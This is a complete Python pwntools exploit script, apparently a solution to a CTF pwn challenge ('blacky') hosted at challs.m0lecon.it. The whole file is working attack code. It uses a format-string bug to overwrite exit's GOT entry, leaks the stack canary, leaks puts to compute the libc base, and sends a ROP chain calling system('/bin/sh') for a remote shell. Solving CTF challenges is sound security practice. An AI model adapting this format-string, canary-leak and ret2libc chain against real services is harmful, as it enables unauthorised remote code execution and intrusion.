#!/usr/bin/python

from pwn import *
from LibcSearcher import *

exit_got        = 0x602088
exit_plt        = 0x4008e0
_start          = 0x4008f0
puts_plt        = 0x400810
system_plt      = 0x400840
puts_got        = 0x602020
pop_rdi         = 0x400d23
pop_rsi_r15     = 0x400d21

context.log_level = 'debug'
config = '''
b *0x400b39
set follow-fork-mode parent
'''
#s = process('./blacky')
s = remote('challs.m0lecon.it', 9011)
#gdb.attach(s, config)

#Change exit() to _start()
s.recvuntil('Size: ')
s.sendline(str(0x7fff003f))
s.recvuntil('Input: ')
payload  = 'ECHO-'
payload  = payload.ljust(0x10000+10, 'A')
fmt      = '%24$p%{}c%12$hhn'.format(0xf0-0x27)
real_len = len('[!] Error: Format err' + fmt)
fmt     += 'B'*(40-real_len)                                     #padding
fmt     += p64(exit_got)
payload += fmt
s.sendline(payload)

#Leak canary
s.recvuntil('[!] Error: Format err')
canary  = int(s.recv(18), 16)
log.success('Canary: ' + hex(canary))

#Leak address of "/bin/sh"
s.recvuntil('Size: ')
s.sendline(str(0x7fff003f))
s.recvuntil('Input: ')
payload  = 'ECHO->'
payload  = payload.ljust(0x10028, 'A')
payload += p64(canary)
payload += 'A'*8
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(_start)
s.sendline(payload)
s.recvuntil('AAAAAAAA\n')
leak = s.recvline(False)
print repr(leak)
puts     = u64(leak + '\x00'*2)
libc     = LibcSearcher('puts', puts)
base     = puts - libc.dump('puts')
binsh    = base + libc.dump('str_bin_sh')
log.success('puts: ' + hex(puts))
log.success('binsh: ' + hex(binsh))

#Attack
s.recvuntil('Size: ')
s.sendline(str(0x7fff003f))
s.recvuntil('Input: ')
payload  = 'ECHO->'
payload  = payload.ljust(0x10028, 'A')
payload += p64(canary)
payload += 'A'*8
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(pop_rsi_r15) + p64(0)*2
payload += p64(system_plt)
s.sendline(payload)





















s.interactive()
